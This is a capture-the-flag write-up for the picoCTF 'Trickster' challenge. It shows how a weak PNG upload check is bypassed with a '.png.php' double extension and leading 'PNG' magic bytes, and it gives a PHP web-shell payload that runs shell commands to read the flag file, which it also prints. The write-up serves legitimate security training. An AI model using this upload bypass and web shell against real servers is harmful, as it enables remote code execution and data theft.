# Trickster 
I found a web app that can help process images: PNG images only!
Additional details will be available after launching your challenge instance.

## Solution
We are given a simple website that supports PNG uploads. After trying some simple attacks (uploading PHP files to get some information), I only got slightly useful feedback. I could have used this information to slowly guess the correct payload, but I decided to check `robots.txt` to see if it revealed any useful information. The following content was available in the text file:

```
User-agent: *
Disallow: /instructions.txt
Disallow: /uploads/
```
/instructions.txt reads as follows:

```
Let's create a web app for PNG Images processing.
It needs to:
Allow users to upload PNG images
	look for ".png" extension in the submitted files
	make sure the magic bytes match (not sure what this is exactly but wikipedia says that the first few bytes contain 'PNG' in hexadecimal: "50 4E 47" )
after validation, store the uploaded files so that the admin can retrieve them later and do the necessary processing.
```
This means that we can upload a file as long as ".png" is in the name. We can name the file ".png.php", so that it is still a php file, but fills the requirement of including ".png"

We found the upload page at /upload/ and we can access the file we uploaded from here.

This means that we can create a malicious PHP file, that the server will think is a PNG image. We can then access the malicious file from `/uploads/[file].png.php` and make it run arbitrary PHP code.

I made the following PHP file to get the flag:

```php
PNG

<?php echo shell_exec("cat ../MQZWCYZWGI2WE.txt");?>
```

To find the location of the flag I had to run `ls` in a few directories.

 
 picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_d3ac625b}
